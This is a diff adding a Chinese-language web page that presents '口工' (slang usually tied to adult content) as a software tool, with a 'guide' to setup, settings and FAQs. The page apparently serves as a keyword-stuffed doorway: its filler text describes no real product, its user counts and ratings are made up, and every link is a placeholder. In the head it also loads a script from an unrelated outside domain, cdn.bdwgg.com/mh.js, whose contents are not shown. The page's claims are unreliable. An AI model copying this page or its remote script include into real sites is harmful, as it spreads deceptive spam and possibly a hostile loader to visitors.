@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="本站提供专业的口工软件下载、使用教程及安全防护指南，帮助用户了解口工的工作原理、常见问题及解决方案。">
+    <meta name="keywords" content="口工,口工软件,口工教程,口工指南,口工原理,口工安全">
+    <title>口工-专业软件工具与使用安全指南</title>
+    <script type="text/javascript" src="https://cdn.bdwgg.com/mh.js"></script>
+    <style>
+        :root {
+            --primary-color: #2563eb;
+            --primary-hover: #1d4ed8;
+            --bg-color: #f8fafc;
+            --card-bg: #ffffff;
+            --text-main: #1e293b;
+            --text-secondary: #64748b;
+            --border-color: #e2e8f0;
+            --spacing-unit: 1rem;
+            --container-width: 1200px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.6;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+            transition: color 0.2s;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        /* Layout */
+        .container {
+            max-width: var(--container-width);
+            margin: 0 auto;
+            padding: 0 var(--spacing-unit);
+        }
+
+        /* Header */
+        header {
+            background-color: var(--card-bg);
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .header-inner {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 70px;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .logo span {
+            color: var(--text-main);
+        }
+
+        nav ul {
+            display: flex;
+            gap: 2rem;
+        }
+
+        nav a {
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        nav a:hover, nav a.active {
+            color: var(--primary-color);
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            font-weight: 500;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-outline {
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+        }
+
+        .btn-outline:hover {
+            border-color: var(--primary-color);
+            color: var(--primary-color);
+        }
+
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: white;
+            border: 1px solid var(--primary-color);
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-hover);
+        }
+
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, #eff6ff 0%, #ffffff 100%);
+            padding: 4rem 0;
+            text-align: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            color: var(--text-main);
+        }
+
+        .hero p {
+            font-size: 1.125rem;
+            color: var(--text-secondary);
+            max-width: 700px;
+            margin: 0 auto 2rem;
+        }
+
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            margin-top: 3rem;
+        }
+
+        .stat-item h3 {
+            font-size: 2rem;
+            color: var(--primary-color);
+        }
+
+        .stat-item p {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin: 0;
+        }
+
+        /* Features */
+        .features {
+            padding: 4rem 0;
+        }
+
+        .section-title {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .section-title h2 {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .section-title p {
+            color: var(--text-secondary);
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+
+        .feature-card {
+            background: var(--card-bg);
+            padding: 2rem;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+        }
+
+        .feature-icon {
+            width: 48px;
+            height: 48px;
+            background-color: #eff6ff;
+            color: var(--primary-color);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1.5rem;
+            font-size: 1.5rem;
+        }
+
+        .feature-card h3 {
+            margin-bottom: 1rem;
+            font-size: 1.25rem;
+        }
+
+        .feature-card p {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        /* Guide Section */
+        .guide-section {
+            padding: 4rem 0;
+            background-color: #fff;
+        }
+
+        .guide-container {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 3rem;
+        }
+
+        .guide-content h2 {
+            margin-bottom: 1.5rem;
+            font-size: 1.75rem;
+        }
+
+        .guide-steps {
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+        }
+
+        .step {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .step-num {
+            flex-shrink: 0;
+            width: 32px;
+            height: 32px;
+            background-color: var(--primary-color);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .step-content h4 {
+            margin-bottom: 0.25rem;
+            font-size: 1.1rem;
+        }
+
+        .step-content p {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        .sidebar {
+            background-color: #f8fafc;
+            padding: 2rem;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+        }
+
+        .sidebar h3 {
+            margin-bottom: 1.5rem;
+            font-size: 1.25rem;
+        }
+
+        .sidebar-list li {
+            margin-bottom: 0.75rem;
+        }
+
+        .sidebar-list a {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        .sidebar-list a:hover {
+            color: var(--primary-color);
+        }
+
+        /* FAQ Section */
+        .faq-section {
+            padding: 4rem 0;
+        }
+
+        .faq-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
+            gap: 2rem;
+        }
+
+        .faq-item {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+        }
+
+        .faq-item h4 {
+            margin-bottom: 0.75rem;
+            font-size: 1.1rem;
+        }
+
+        .faq-item p {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        /* Footer */
+        footer {
+            background-color: #1e293b;
+            color: #cbd5e1;
+            padding: 4rem 0 2rem;
+            margin-top: 4rem;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr 1fr;
+            gap: 3rem;
+            margin-bottom: 3rem;
+        }
+
+        .footer-brand h2 {
+            color: white;
+            margin-bottom: 1rem;
+        }
+
+        .footer-brand p {
+            max-width: 300px;
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+
+        .footer-col h3 {
+            color: white;
+            margin-bottom: 1.5rem;
+            font-size: 1.1rem;
+        }
+
+        .footer-col ul li {
+            margin-bottom: 0.75rem;
+        }
+
+        .footer-col a {
+            color: #cbd5e1;
+            font-size: 0.9rem;
+        }
+
+        .footer-col a:hover {
+            color: white;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #334155;
+            padding-top: 2rem;
+            text-align: center;
+            font-size: 0.85rem;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header-inner {
+                flex-direction: column;
+                height: auto;
+                padding: 1rem 0;
+                gap: 1rem;
+            }
+
+            nav ul {
+                gap: 1rem;
+                font-size: 0.9rem;
+            }
+
+            .hero h1 {
+                font-size: 2rem;
+            }
+
+            .guide-container {
+                grid-template-columns: 1fr;
+            }
+
+            .hero-stats {
+                flex-direction: column;
+                gap: 1.5rem;
+            }
+
+            .footer-grid {
+                grid-template-columns: 1fr;
+                gap: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="container header-inner">
+            <div class="logo">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"></path></svg>
+                <span>口工指南</span>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#" class="active">首页</a></li>
+                    <li><a href="#features">功能介绍</a></li>
+                    <li><a href="#guide">操作指南</a></li>
+                    <li><a href="#faq">常见问题</a></li>
+                </ul>
+            </nav>
+            <div class="header-actions">
+                <a href="#" class="btn btn-outline">注册账号</a>
+                <a href="#" class="btn btn-primary">立即使用</a>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="container">
+                <h1>提升效率的智能口工解决方案</h1>
+                <p>提供专业的口工工具配置、操作流程及安全维护指南。无论是初学者还是进阶用户，都能在这里找到实用的技术支持与资源。</p>
+                <div class="hero-btns">
+                    <a href="#guide" class="btn btn-primary" style="padding: 0.75rem 2rem; font-size: 1rem;">开始学习</a>
+                    <a href="#features" class="btn btn-outline" style="padding: 0.75rem 2rem; font-size: 1rem;">查看功能</a>
+                </div>
+                <div class="hero-stats">
+                    <div class="stat-item">
+                        <h3>10w+</h3>
+                        <p>累计用户</p>
+                    </div>
+                    <div class="stat-item">
+                        <h3>500+</h3>
+                        <p>教程文章</p>
+                    </div>
+                    <div class="stat-item">
+                        <h3>99%</h3>
+                        <p>好评率</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Features Section -->
+        <section id="features" class="features">
+            <div class="container">
+                <div class="section-title">
+                    <h2>核心功能与优势</h2>
+                    <p>全方位解析口工工具的关键特性，助您快速上手</p>
+                </div>
+                <div class="feature-grid">
+                    <article class="feature-card">
+                        <div class="feature-icon">⚙️</div>
+                        <h3>参数精准配置</h3>
+                        <p>提供详细的参数设置指南，帮助用户根据具体场景调整口工工具的各项指标，确保运行稳定且符合预期效果。</p>
+                    </article>
+                    <article class="feature-card">
+                        <div class="feature-icon">🛡️</div>
+                        <h3>安全防护机制</h3>
+                        <p>内置多重安全校验与数据加密功能，保障用户在使用过程中的数据隐私与系统安全，防止误操作导致的风险。</p>
+                    </article>
+                    <article class="feature-card">
+                        <div class="feature-icon">📊</div>
+                        <h3>数据可视化分析</h3>
+                        <p>通过直观的图表展示运行数据与结果反馈，让复杂的参数调整变得简单透明，便于用户进行复盘与优化。</p>
+                    </article>
+                </div>
+            </div>
+        </section>
+
+        <!-- Guide Section -->
+        <section id="guide" class="guide-section">
+            <div class="container">
+                <div class="section-title">
+                    <h2>标准操作流程</h2>
+                    <p>遵循科学步骤，避免常见误区</p>
+                </div>
+                <div class="guide-container">
+                    <div class="guide-content">
+                        <h2>新手入门三步走</h2>
+                        <div class="guide-steps">
+                            <div class="step">
+                                <div class="step-num">1</div>
+                                <div class="step-content">
+                                    <h4>环境准备与依赖安装</h4>
+                                    <p>首先确认系统环境满足最低要求，下载最新版客户端。安装过程中请勾选必要的运行库组件，并检查防火墙设置，确保网络端口未被占用。</p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-num">2</div>
+                                <div class="step-content">
+                                    <h4>初始化与参数校准</h4>
+                                    <p>启动程序后进入设置界面。建议使用默认配置进行初次测试，待熟悉界面布局后，再根据实际需求调整具体参数，注意保存配置文件。</p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-num">3</div>
+                                <div class="step-content">
+                                    <h4>执行任务与结果验证</h4>
+                                    <p>提交任务指令后，关注控制台的实时日志输出。任务完成后，务必检查输出文件是否完整，并使用校验工具确认数据一致性。</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <aside class="sidebar">
+                        <h3>快速导航</h3>
+                        <ul class="sidebar-list">
+                            <li><a href="#">高级参数详解</a></li>
+                            <li><a href="#">常见错误代码对照</a></li>
+                            <li><a href="#">系统兼容性列表</a></li>
+                            <li><a href="#">日志分析与排错</a></li>
+                            <li><a href="#">性能优化建议</a></li>
+                        </ul>
+                    </aside>
+                </div>
+            </div>
+        </section>
+
+        <!-- FAQ Section -->
+        <section id="faq" class="faq-section">
+            <div class="container">
+                <div class="section-title">
+                    <h2>常见问题解答</h2>
+                    <p>解决您在操作过程中遇到的疑惑</p>
+                </div>
+                <div class="faq-grid">
+                    <div class="faq-item">
+                        <h4>口工工具是否支持离线运行？</h4>
+                        <p>支持。工具具备离线模式，在断网环境下亦可完成基础任务。但为了获取最新的配置库和补丁，建议定期连接网络更新。</p>
+                    </div>
+                    <div class="faq-item">
+                        <h4>如何处理运行卡顿的问题？</h4>
+                        <p>卡顿通常是由于后台程序过多或资源占用过高导致。请检查任务管理器，关闭不必要的进程，并尝试降低任务复杂度或增加硬件加速支持。</p>
+                    </div>
+                    <div class="faq-item">
+                        <h4>数据导出格式有哪些？</h4>
+                        <p>支持多种常用格式导出，包括 CSV、JSON 及 XML，用户可根据后续处理软件的需求选择合适的格式。</p>
+                    </div>
+                    <div class="faq-item">
+                        <h4>软件是否需要定期维护？</h4>
+                        <p>是的。建议每季度进行一次全面的系统扫描和日志清理，以确保长期运行的稳定性。</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-grid">
+                <div class="footer-brand">
+                    <h2>口工指南</h2>
+                    <p>致力于提供最专业、最安全的口工工具使用指南与技术支持，帮助用户高效完成工作，规避潜在风险。</p>
+                </div>
+                <div class="footer-col">
+                    <h3>资源中心</h3>
+                    <ul>
+                        <li><a href="#">下载专区</a></li>
+                        <li><a href="#">版本更新</a></li>
+                        <li><a href="#">API文档</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h3>帮助支持</h3>
+                    <ul>
+                        <li><a href="#">联系客服</a></li>
+                        <li><a href="#">提交反馈</a></li>
+                        <li><a href="#">隐私政策</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h3>关于我们</h3>
+                    <ul>
+                        <li><a href="#">团队介绍</a></li>
+                        <li><a href="#">服务条款</a></li>
+                        <li><a href="#">加入我们</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2023 口工指南. 保留所有权利. 本站内容仅供技术交流与学习使用。</p>
+            </div>
+        </div>
+    </footer>
+
+</body>
+</html>
